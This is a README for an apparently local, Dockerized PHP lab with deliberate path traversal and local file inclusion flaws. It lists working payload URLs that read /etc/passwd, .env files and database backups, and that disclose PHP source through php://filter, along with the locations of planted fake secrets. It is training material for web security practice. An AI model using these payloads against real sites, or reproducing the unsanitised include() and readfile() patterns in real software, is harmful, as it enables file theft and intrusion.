# LFI-PathTraversal — NovaShop Gallery

Local, Dockerized lab: a PHP "product gallery" site (Ubuntu + Apache2 + PHP) with two intentional vulnerabilities — **Path Traversal** and **Local File Inclusion (LFI)**. The site UI itself gives no indication it's a lab; this README is the only place the vulnerabilities are documented.

Part of a planned multi-repo lab suite, separated by vulnerability class. This repo is scoped to path traversal + LFI only.

## Quick start

```bash
docker compose up -d --build
```

Visit `http://localhost:8000`.

To stop:

```bash
docker compose down
```

## Vulnerability 1 — Path Traversal (`image.php`)

`image.php?file=<name>` reads a file directly from `images/` with no sanitization (`readfile()`, no `basename()`/`realpath()`/allow-list). Non-image extensions are served as `text/plain`, so leaked source/text renders inline in the browser.

Example payloads:

```
http://localhost:8000/image.php?file=../../../../../../etc/passwd
http://localhost:8000/image.php?file=../../../../../../etc/hostname
http://localhost:8000/image.php?file=../config/db.php
http://localhost:8000/image.php?file=../.env
http://localhost:8000/image.php?file=../../../../../../var/backups/db_backup.sql
```

Note: `config/db.php` is `.php`, so `readfile()` returns its raw source (not executed) — real PHP source code, not the wrapper trick needed in endpoint 2.

## Vulnerability 2 — LFI (`index.php`)

`index.php?page=<path>` passes the parameter straight into `include()`. Nav links use full relative paths with extension (e.g. `pages/about.php`), so there's no auto-appended `.php` to defeat traversal.

Traversal to plain-text files (dumps directly, no wrapper needed):

```
http://localhost:8000/index.php?page=../../../../../../etc/passwd
http://localhost:8000/index.php?page=../../../../../../etc/hostname
http://localhost:8000/index.php?page=.env
```

Source disclosure of `.php` files via the `php://filter` wrapper (needed because `include()` would otherwise execute the PHP instead of showing it):

```
http://localhost:8000/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://localhost:8000/index.php?page=php://filter/convert.base64-encode/resource=image.php
http://localhost:8000/index.php?page=php://filter/convert.base64-encode/resource=config/db.php
```

Response body is base64 — decode it to read the source.

## Planted secrets

| File | Path in container | How to reach it |
|---|---|---|
| Fake DB credentials | `/var/www/html/config/db.php` | traversal + `php://filter` (it's PHP source) |
| Fake `.env` | `/var/www/html/.env` | direct traversal (plain text) |
| Fake DB backup | `/var/backups/db_backup.sql` | deep traversal, outside the webroot |
| Real system files | `/etc/passwd`, `/etc/hostname` | direct traversal, no planting needed |

All credentials/keys in `.env`, `config/db.php`, and `db_backup.sql` are fabricated — not real.

## Logs (for a possible future log-poisoning module — not exploitable here)

Real Apache/PHP logs exist at predictable paths:

```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache2/php_errors.log
```

## Notes

- Local use only. Don't expose port 8000 to an untrusted network.
- No git repository is initialized by this build — when you commit, do not add a Claude co-author trailer.
